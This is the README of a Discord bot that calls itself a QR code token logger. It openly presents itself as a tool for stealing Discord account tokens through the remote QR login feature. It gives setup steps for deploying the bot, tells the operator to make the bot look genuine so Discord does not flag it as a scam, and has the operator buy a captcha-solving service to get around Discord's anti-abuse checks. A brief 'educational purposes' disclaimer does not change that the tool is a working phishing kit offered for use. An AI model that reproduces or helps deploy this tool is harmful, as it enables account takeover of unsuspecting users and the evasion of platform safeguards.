<h1 align="center">Discord QR Code Token Logger</h1>
<h3 align="center">Discord Bot that uses the remote login feature to steal tokens!</br>Make sure to star the project to keep it being updated! ⭐</h3>

## Features

- **Looks exactly like a real bot.** (when configured properly)
- **Memory Efficient.** (doesn't use chromedriver.exe or any browser)
- **Very stable and robust.** (minimal crashes and bugs)
- **Only working method** (that doesn't use chromedriver.exe)

## Disclaimers

- This is a bot that is not affiliated with any of the Discord or Discord Inc. teams.
- This was made for educational purposes. It is not meant to be used for malicious purposes.
- Any use of this bot is at your own risk. I am not responsible for any damage that may occur.
- You need to have an <a href="https://capmonster.cloud">CapMonster</a> account with funds.

<details><summary><h2>Video Tutorial</h2></summary>

[![token logger video](https://i.imgur.com/N6J5VaX.png)](https://youtu.be/yetw5mZXf74)

</details>

## Setup

- **Install [Node LTS](https://nodejs.org/en/)**
  - optionially install yarn package manager for ease of use. `npm install -g yarn`
- **Clone the repository and install dependancies**
  - `gh repo clone ulnk/scam`
  - `npm install` or `yarn`
- **Create a new Discord Bot**
  - Enable all intents for the bot
  - **IMPORTANT**
    - To avoid discord from flagging the bot as a scam bot, you must make the bot profile look as real as possible. This includes a profile picture, username, and description. Please spend some time on this.
- **Edit config-default.json**
  - Rename it to `config.json`
  - Edit all fields to your needs.
  - Make sure the bot is inside the log server and has its roles above anything else.
  - **ANTI-CAPTCHA - IMPORTANT PLEASE READ**
    - There is a 99.9% chance Discord will require you to complete a captcha if lots of requests are made to the bot or if the bot is flagged as suspicious (This is to stop the older scam bots). To make this bot work, you **MUST** provide a working api key. The service is very cheap and highly respected.
- **Add emojis to a discord server**
  - You can select all and drag into emojis section in server settings to quickly add all.
  - The bot will automatically find the emojis no need to get all ids. (do not change the name of the emojis)
- **Start the bot**
  - `npm run start` or `yarn start`
  - Once the bot is active, use the command `/spawn` to spawn the verify message.
    - If the emojis are not found, please make sure they are named correctly and are in the same server as the bot. (`w_<EMOJINAME>`)

### Libraries Used

- **discord.js** (discord bot) <img alt="preview badge" src="https://img.shields.io/npm/v/discord.js">
- **crypto** (private keys & public keys) <img alt="preview badge" src="https://img.shields.io/npm/v/crypto">
- **ws** (web socket) <img alt="preview badge" src="https://img.shields.io/npm/v/ws">
- **jimp** (image editing for qr code) <img alt="preview badge" src="https://img.shields.io/npm/v/jimp">
- **capmonster** (anti-captcha)<img alt="preview badge" src="https://img.shields.io/npm/v/node-capmonster">
